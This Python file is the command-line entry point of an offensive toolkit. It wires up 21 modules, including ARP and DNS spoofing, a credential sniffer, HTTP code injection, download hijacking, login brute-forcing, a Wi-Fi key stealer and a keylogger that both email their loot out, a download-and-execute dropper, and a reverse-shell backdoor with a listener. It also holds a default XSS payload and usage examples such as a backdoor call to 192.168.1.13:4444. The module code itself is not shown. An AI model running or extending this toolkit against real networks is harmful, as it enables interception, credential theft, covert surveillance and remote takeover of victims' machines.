#!/usr/bin/env python3
import argparse
import importlib
import os
import signal
import sys
try:
    signal.signal(signal.SIGPIPE, signal.SIG_DFL)
except (AttributeError, ValueError):
    pass
from core.banner import BANNER, print_banner, info, success, warn, error, highlight, CYAN, GREEN, BLUE, YELLOW, RED, MAGENTA, BRIGHT, RESET
from core.checker import verify_dependencies, check_root
VERSION = '2.0.0'

def setup_mac_changer_parser(subparser):
    subparser.add_argument('-i', '--interface', required=False, help='Network interface (e.g. eth0, wlan0)')
    subparser.add_argument('-m', '--mac', required=False, help='New MAC address to assign (e.g. 00:11:22:33:44:55)')
    subparser.add_argument('--random', action='store_true', help='Generate and apply a randomized MAC address')
    subparser.add_argument('--show', action='store_true', help='Display current MAC address without modifying it')

def setup_scan_parser(subparser):
    subparser.add_argument('-t', '--target', required=False, help='Target IP address or CIDR range (e.g. 192.168.1.1/24)')
    subparser.add_argument('-i', '--interface', required=False, help='Network interface to send probes on')
    subparser.add_argument('--timeout', type=int, default=1, help='Probe response timeout in seconds (default: 1)')

def setup_arp_spoof_parser(subparser):
    subparser.add_argument('-t', '--target', required=False, help='Target host IP address to poison')
    subparser.add_argument('-s', '--spoof', '-g', '--gateway', dest='spoof', required=False, help='Gateway/Router IP address to impersonate')
    subparser.add_argument('-i', '--interface', required=False, help='Network interface to send forged ARP responses')
    subparser.add_argument('--interval', type=float, default=2.0, help='Packet transmission interval in seconds (default: 2.0)')

def setup_arp_detector_parser(subparser):
    subparser.add_argument('-i', '--interface', default='eth0', help='Interface to monitor for ARP spoofing (default: eth0)')

def setup_packet_sniffer_parser(subparser):
    subparser.add_argument('-i', '--interface', default='eth0', help='Interface to sniff packets on (default: eth0)')
    subparser.add_argument('--urls-only', action='store_true', help='Filter and display visited HTTP URLs only')
    subparser.add_argument('--creds-only', action='store_true', help='Filter and display intercepted login credentials only')

def setup_dns_spoof_parser(subparser):
    subparser.add_argument('-r', '--redirect-ip', required=False, help='Target IP address to redirect DNS requests to')
    subparser.add_argument('-d', '--domains', nargs='+', default=['bing.com', 'google.com'], help="Domain names to spoof (e.g. bing.com google.com or '*')")
    subparser.add_argument('-q', '--queue-num', type=int, default=0, help='NFQUEUE queue index (default: 0)')
    subparser.add_argument('--local', action='store_true', help='Intercept local outbound/inbound DNS requests instead of forwarded')

def setup_net_cut_parser(subparser):
    subparser.add_argument('-q', '--queue-num', type=int, default=0, help='NFQUEUE queue index (default: 0)')
    group = subparser.add_mutually_exclusive_group()
    group.add_argument('--drop', action='store_true', default=True, help='Drop all intercepted packets (cut traffic)')
    group.add_argument('--accept', action='store_true', help='Forward all intercepted packets')

def setup_code_injector_parser(subparser):
    subparser.add_argument('-p', '--payload', default="<script>alert('Security Audit: XSS Injected');</script>", help='HTML/JS payload string to inject')
    subparser.add_argument('-q', '--queue-num', type=int, default=0, help='NFQUEUE queue index (default: 0)')

def setup_replace_downloads_parser(subparser):
    subparser.add_argument('-u', '--redirect-url', required=False, help='Replacement download URL to redirect victim to')
    subparser.add_argument('-e', '--extension', default='.exe', help='Target file extension to intercept (default: .exe)')
    subparser.add_argument('-q', '--queue-num', type=int, default=0, help='NFQUEUE queue index (default: 0)')

def setup_crawler_parser(subparser):
    subparser.add_argument('-u', '--url', required=False, help='Target base URL to discover directories on')
    subparser.add_argument('-w', '--wordlist', required=False, help='Path to custom wordlist file (defaults to crawler/common.txt)')

def setup_spider_parser(subparser):
    subparser.add_argument('-u', '--url', required=False, help='Target web application base URL to spider')
    subparser.add_argument('-d', '--max-depth', type=int, default=10, help='Maximum recursion depth for spidering (default: 10)')

def setup_extract_forms_parser(subparser):
    subparser.add_argument('-u', '--url', required=False, help='Target page URL containing HTML forms')
    subparser.add_argument('--submit', action='store_true', help='Attempt test payload submission to extracted form inputs')

def setup_vuln_scanner_parser(subparser):
    subparser.add_argument('-u', '--url', required=False, help='Target application root URL')
    subparser.add_argument('--ignore', nargs='+', help='URLs or endpoints to omit from scanning (e.g. logout.php)')
    subparser.add_argument('--login-url', help='Form action URL for automated login authentication')
    subparser.add_argument('--username', help='Username for authentication')
    subparser.add_argument('--password', help='Password for authentication')

def setup_brute_login_parser(subparser):
    subparser.add_argument('-u', '--url', required=False, help='Target HTTP POST login URL')
    subparser.add_argument('-w', '--wordlist', required=False, help='Path to password dictionary (defaults to post/passwords.txt)')
    subparser.add_argument('-U', '--user', default='admin', help='Target username to test (default: admin)')
    subparser.add_argument('--success-str', default='You have logged in', help='Response body indicator confirming successful authentication')
    subparser.add_argument('--user-field', default='username', help='Form field name for username (default: username)')
    subparser.add_argument('--pass-field', default='password', help='Form field name for password (default: password)')

def setup_exec_cmd_parser(subparser):
    subparser.add_argument('-c', '--command', required=False, help='System command to execute on target system')
    subparser.add_argument('-e', '--email', help='SMTP destination email for report exfiltration')
    subparser.add_argument('-p', '--password', help='SMTP application password')
    subparser.add_argument('--smtp-server', default='smtp.gmail.com', help='SMTP host (default: smtp.gmail.com)')
    subparser.add_argument('--smtp-port', type=int, default=587, help='SMTP port (default: 587)')

def setup_wifi_passwords_parser(subparser):
    subparser.add_argument('-e', '--email', help='Destination email for exfiltrating recovered keys')
    subparser.add_argument('-p', '--password', help='SMTP application password')
    subparser.add_argument('--dry-run', action='store_true', help='Print recovered Wi-Fi profiles and passwords to screen only')

def setup_download_parser(subparser):
    subparser.add_argument('-u', '--url', required=False, help='Remote file URL to download')
    subparser.add_argument('-o', '--output', required=False, help='Local destination file path')

def setup_download_exec_parser(subparser):
    subparser.add_argument('-u', '--url', required=False, help='Remote payload URL to download and execute')
    subparser.add_argument('-c', '--command', help='Custom command to run downloaded artifact')
    subparser.add_argument('-e', '--email', help='Destination email for execution output report')
    subparser.add_argument('-p', '--password', help='SMTP application password')
    subparser.add_argument('--no-delete', action='store_true', help='Retain downloaded artifact after execution (do not delete)')

def setup_keylogger_parser(subparser):
    subparser.add_argument('-i', '--interval', type=int, default=60, help='Log reporting interval in seconds (default: 60)')
    subparser.add_argument('-e', '--email', help='Destination email for periodic keystroke logs')
    subparser.add_argument('-p', '--password', help='SMTP application password')
    subparser.add_argument('--local-log', help='Local file path to append keystroke logs instead of email')

def setup_listener_parser(subparser):
    subparser.add_argument('-i', '--ip', default='0.0.0.0', help='IP address to bind reverse shell listener to (default: 0.0.0.0)')
    subparser.add_argument('-p', '--port', type=int, default=4444, help='Port to listen for incoming shells on (default: 4444)')

def setup_backdoor_parser(subparser):
    subparser.add_argument('-i', '--ip', required=False, help='Remote listener IP address to connect back to')
    subparser.add_argument('-p', '--port', type=int, default=4444, help='Remote listener port (default: 4444)')
TOOLS = {'mac-changer': {'flags': ['--mac-changer', '--mac', '--macchanger'], 'module': 'modules.mac_changer', 'category': 'Interface & MAC Configuration', 'description': 'View, spoof, or randomize network interface hardware MAC address', 'setup': setup_mac_changer_parser}, 'scan': {'flags': ['--scan', '--network-scanner', '--netscan'], 'module': 'modules.network_scanner', 'category': 'Network Reconnaissance', 'description': 'ARP broadcast network discovery scanner for active hosts and MACs', 'setup': setup_scan_parser}, 'arp-spoof': {'flags': ['--arp-spoof', '--arpspoof', '--mitm'], 'module': 'modules.arp_spoof', 'category': 'Traffic Interception & MITM', 'description': 'ARP cache poisoning attack to establish Man-In-The-Middle position', 'setup': setup_arp_spoof_parser}, 'arp-detector': {'flags': ['--arp-detector', '--arpdetector', '--detect-arp'], 'module': 'modules.arp_detector', 'category': 'Traffic Interception & MITM', 'description': 'Live monitor to detect ARP poisoning and spoofing attacks against this host', 'setup': setup_arp_detector_parser}, 'sniff': {'flags': ['--sniff', '--packet-sniffer', '--sniffer'], 'module': 'modules.packet_sniffer', 'category': 'Traffic Interception & MITM', 'description': 'HTTP packet sniffer to capture visited URLs and plaintext credentials', 'setup': setup_packet_sniffer_parser}, 'dns-spoof': {'flags': ['--dns-spoof', '--dnsspoof', '--dns-spoofer'], 'module': 'modules.dns_spoofer', 'category': 'Traffic Interception & MITM', 'description': 'Intercept DNS queries via NFQUEUE and forge redirect responses', 'setup': setup_dns_spoof_parser}, 'net-cut': {'flags': ['--net-cut', '--netcut', '--traffic-blocker'], 'module': 'modules.net_cut', 'category': 'Traffic Interception & MITM', 'description': 'Block or control forwarded network packets via NFQUEUE', 'setup': setup_net_cut_parser}, 'code-injector': {'flags': ['--code-injector', '--inject-code', '--injector'], 'module': 'modules.code_injector', 'category': 'Traffic Interception & MITM', 'description': 'Inject arbitrary HTML/JavaScript code into unencrypted HTTP traffic', 'setup': setup_code_injector_parser}, 'replace-downloads': {'flags': ['--replace-downloads', '--replace-download', '--hijack-downloads'], 'module': 'modules.replace_downloads', 'category': 'Traffic Interception & MITM', 'description': 'Hijack HTTP file downloads and redirect victim to replacement URL', 'setup': setup_replace_downloads_parser}, 'crawler': {'flags': ['--crawler', '--crawl', '--dir-scan'], 'module': 'modules.crawler', 'category': 'Web Application Security', 'description': 'Discover hidden web directories and sensitive files using wordlists', 'setup': setup_crawler_parser}, 'spider': {'flags': ['--spider', '--web-spider'], 'module': 'modules.spider', 'category': 'Web Application Security', 'description': 'Recursively crawl and extract all internal links across target website', 'setup': setup_spider_parser}, 'extract-forms': {'flags': ['--extract-forms', '--forms', '--form-scraper'], 'module': 'modules.extract_forms', 'category': 'Web Application Security', 'description': 'Extract and inspect HTML forms, action paths, methods, and input fields', 'setup': setup_extract_forms_parser}, 'vuln-scanner': {'flags': ['--vuln-scanner', '--vuln-scan', '--xss-scanner'], 'module': 'modules.vuln_scanner', 'category': 'Web Application Security', 'description': 'Comprehensive crawler and automated reflected XSS vulnerability scanner', 'setup': setup_vuln_scanner_parser}, 'brute-login': {'flags': ['--brute-login', '--login-cracker', '--post-brute'], 'module': 'modules.brute_login', 'category': 'Web Application Security', 'description': 'Dictionary brute-force attack on HTTP POST login endpoints', 'setup': setup_brute_login_parser}, 'exec-cmd': {'flags': ['--exec-cmd', '--execute-command', '--cmd-report'], 'module': 'modules.exec_command', 'category': 'Endpoint Diagnostics & Reporting', 'description': 'Execute local shell command and optionally email report via SMTP', 'setup': setup_exec_cmd_parser}, 'wifi-passwords': {'flags': ['--wifi-passwords', '--wifi-stealer', '--wifi-report'], 'module': 'modules.wifi_stealer', 'category': 'Endpoint Diagnostics & Reporting', 'description': 'Recover stored Wi-Fi profiles and plaintext keys (Windows & Linux)', 'setup': setup_wifi_passwords_parser}, 'download': {'flags': ['--download', '--download-file'], 'module': 'modules.download_file', 'category': 'Payload & Utility Delivery', 'description': 'Download remote files and resources via HTTP/HTTPS', 'setup': setup_download_parser}, 'download-exec': {'flags': ['--download-exec', '--download-execute-report', '--dropper'], 'module': 'modules.download_exec', 'category': 'Payload & Utility Delivery', 'description': 'Download payload to temp directory, execute, email report, and cleanup', 'setup': setup_download_exec_parser}, 'keylogger': {'flags': ['--keylogger', '--keylog', '--zlogger'], 'module': 'modules.keylogger', 'category': 'Endpoint Diagnostics & Reporting', 'description': 'Asynchronous keystroke recorder with periodic SMTP exfiltration or local log', 'setup': setup_keylogger_parser}, 'listener': {'flags': ['--listener', '--listen', '--c2-server'], 'module': 'modules.listener', 'category': 'Remote Administration', 'description': 'TCP reverse shell listener with interactive terminal and file transfers', 'setup': setup_listener_parser}, 'backdoor': {'flags': ['--backdoor', '--agent', '--reverse-shell'], 'module': 'modules.backdoor', 'category': 'Remote Administration', 'description': 'Reverse shell client agent that connects back to listener server', 'setup': setup_backdoor_parser}}

def print_tool_list():
    print_banner()
    categories = {}
    for name, meta in TOOLS.items():
        cat = meta['category']
        if cat not in categories:
            categories[cat] = []
        categories[cat].append((name, meta))
    for cat, items in categories.items():
        print(f'\n{CYAN}{BRIGHT}===[ {cat} ]==={RESET}')
        for name, meta in items:
            flags_str = ', '.join(meta['flags'])
            print(f'  {GREEN}{BRIGHT}{name:<18}{RESET} (or {YELLOW}{flags_str}{RESET})')
            print(f"     {meta['description']}")
    print('\n' + '=' * 75)
    print(f'Run any module with: {BRIGHT}networksecurity --<module-name> --help{RESET}')
    print(f'Example:             {BRIGHT}networksecurity --scan -t 192.168.1.0/24{RESET}')
    print('=' * 75 + '\n')

def print_main_help():
    print_banner()
    print(f'{CYAN}{BRIGHT}USAGE:{RESET}')
    print(f'  networksecurity --<tool-flag> [options]')
    print(f'  networksecurity <subcommand> [options]\n')
    print(f'{CYAN}{BRIGHT}CORE COMMANDS:{RESET}')
    print(f'  {GREEN}--list, list{RESET}               List all 21 available tools with descriptions')
    print(f'  {GREEN}--check-deps, check-deps{RESET}   Verify Python packages and system dependencies')
    print(f'  {GREEN}--interactive, -I{RESET}          Launch interactive menu-driven mode')
    print(f'  {GREEN}--version, -v{RESET}              Display version information')
    print(f'  {GREEN}--help, -h{RESET}                 Show this help menu\n')
    print(f'{CYAN}{BRIGHT}QUICK USAGE EXAMPLES:{RESET}')
    print(f'  networksecurity {YELLOW}--mac-changer{RESET} -i eth0 --random')
    print(f'  networksecurity {YELLOW}--scan{RESET} -t 192.168.1.0/24')
    print(f'  networksecurity {YELLOW}--arp-spoof{RESET} -t 192.168.1.5 -s 192.168.1.1')
    print(f'  networksecurity {YELLOW}--sniff{RESET} -i eth0')
    print(f'  networksecurity {YELLOW}--dns-spoof{RESET} -r 192.168.1.9 -d bing.com google.com')
    print(f'  networksecurity {YELLOW}--crawler{RESET} -u http://192.168.1.22/mutillidae/')
    print(f'  networksecurity {YELLOW}--spider{RESET} -u http://192.168.1.22/mutillidae/')
    print(f'  networksecurity {YELLOW}--vuln-scanner{RESET} -u http://192.168.1.22/dvwa/')
    print(f'  networksecurity {YELLOW}--wifi-passwords{RESET} --dry-run')
    print(f'  networksecurity {YELLOW}--listener{RESET} -p 4444')
    print(f'  networksecurity {YELLOW}--backdoor{RESET} -i 192.168.1.13 -p 4444\n')
    print(f'For a detailed breakdown of all tools, run: {BRIGHT}networksecurity --list{RESET}\n')

def run_interactive():
    print_banner()
    highlight('Interactive Security Suite Launcher\n')
    tools_list = list(TOOLS.keys())
    for idx, name in enumerate(tools_list, 1):
        meta = TOOLS[name]
        print(f"  {GREEN}{idx:2d}){RESET} {CYAN}{name:<18}{RESET} - {meta['description']}")
    print(f'\n   0) Exit')
    print('-' * 65)
    try:
        choice = input(f'{BRIGHT}Select tool number (1-{len(tools_list)}): {RESET}').strip()
        if not choice or choice == '0':
            info('Exiting interactive menu.')
            return 0
        idx = int(choice) - 1
        if 0 <= idx < len(tools_list):
            selected_name = tools_list[idx]
            selected_tool = TOOLS[selected_name]
            highlight(f"\nLaunching {selected_name} ({selected_tool['description']})")
            params = input(f'Enter arguments for {selected_name} (or --help for options): ').strip()
            args_list = [selected_name] + (params.split() if params else [])
            return dispatch_command(args_list)
        else:
            error('Invalid choice.')
            return 1
    except (ValueError, KeyboardInterrupt):
        info('\nOperation canceled.')
        return 0

def dispatch_command(cmd_args):
    if not cmd_args:
        print_main_help()
        return 0
    first_arg = cmd_args[0]
    matched_tool_name = None
    if first_arg in TOOLS:
        matched_tool_name = first_arg
    else:
        for name, meta in TOOLS.items():
            if first_arg in meta['flags'] or first_arg == f'--{name}':
                matched_tool_name = name
                break
    if not matched_tool_name:
        error(f"Unknown command or flag: '{first_arg}'")
        info("Use 'networksecurity --list' to see all available tools or 'networksecurity --help'.")
        return 1
    tool_meta = TOOLS[matched_tool_name]
    parser = argparse.ArgumentParser(prog=f'networksecurity --{matched_tool_name}', description=f"{tool_meta['description']} (Category: {tool_meta['category']})")
    tool_meta['setup'](parser)
    sub_args = cmd_args[1:]
    try:
        parsed_args = parser.parse_args(sub_args)
    except SystemExit as e:
        return e.code
    try:
        module = importlib.import_module(tool_meta['module'])
        return module.run(parsed_args)
    except ImportError as e:
        error(f"Failed to load module '{tool_meta['module']}': {e}")
        return 1
    except KeyboardInterrupt:
        warn('\nOperation canceled by user.')
        return 130
    except Exception as e:
        error(f'Error during execution: {e}')
        return 1

def main():
    args = sys.argv[1:]
    if not args:
        print_main_help()
        return 0
    first = args[0]
    if first in ['-h', '--help']:
        print_main_help()
        return 0
    elif first in ['-v', '--version']:
        print(f'NetworkSecurity CLI Suite v{VERSION}')
        return 0
    elif first in ['--list', 'list']:
        print_tool_list()
        return 0
    elif first in ['--check-deps', 'check-deps']:
        print_banner()
        verify_dependencies()
        return 0
    elif first in ['-I', '--interactive', 'interactive']:
        return run_interactive()
    return dispatch_command(args)
if __name__ == '__main__':
    sys.exit(main() or 0)
